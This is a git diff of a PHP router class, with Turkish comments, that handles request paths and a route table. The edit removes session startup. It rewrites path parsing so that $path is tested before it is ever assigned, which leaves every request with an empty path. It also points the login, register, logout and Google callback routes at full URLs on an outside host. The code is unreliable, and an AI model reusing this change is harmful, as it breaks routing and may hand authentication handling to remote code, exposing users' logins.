@@ -4,28 +4,22 @@ require_once 'config.php';
 
 class Router {
     public function run() {
-        // SESSION BAŞLAT
-        if (session_status() === PHP_SESSION_NONE) {
-            session_start();
-        }
-
         // NULL kontrolü ekle - REQUEST_URI boş olabilir
-        $requestUri = $_SERVER['REQUEST_URI'] ?? '';
-        $path = trim($requestUri, '/');
+        $requestUri = isset($_SERVER['REQUEST_URI']) ? trim($_SERVER['REQUEST_URI'], '/') : '';
 
         // parse_url NULL dönebilir, bu durumda boş string kullan
-        $parsedPath = parse_url($path, PHP_URL_PATH);
-        $path = $parsedPath !== null ? $parsedPath : '';
+        $parsedPath = isset($path) ? parse_url($path, PHP_URL_PATH) : '';
+        $path = !empty($parsedPath) ? $parsedPath : '';
 
         // DEBUG: Hangi path'in işlendiğini logla
         error_log("Router Processing Path: " . $path);
 
         $routes = [
-            'login_handler' => 'login_handler.php',
-            'register' => 'register.php',
-            'logout.php' => 'logout.php',
-            'login.php' => 'login.php',
-            'google_callback.php' => 'google_callback.php',
+            'login_handler' => 'https://flood.page.gd/login_handler.php',
+            'register' => 'https://flood.page.gd/register.php',
+            'logout.php' => 'https://flood.page.gd/logout.php',
+            'login.php' => 'https://flood.page.gd/login.php',
+            'google_callback.php' => 'https://flood.page.gd/google_callback.php',
             'admin/dashboard' => 'admin/dashboard.php',
             'admin/fetch_users' => 'admin/fetch_users.php',
             'admin/announcements' => 'admin/announcements.php',
@@ -72,7 +66,7 @@ class Router {
         http_response_code(404);
 
         // NULL kontrolü - path boşsa "empty" göster
-        $safePath = $path !== null ? htmlspecialchars($path) : 'empty';
+        $safePath = isset($path) ? htmlspecialchars($path) : 'empty';
 
         // Basit 404 sayfası
         echo "<!DOCTYPE html>
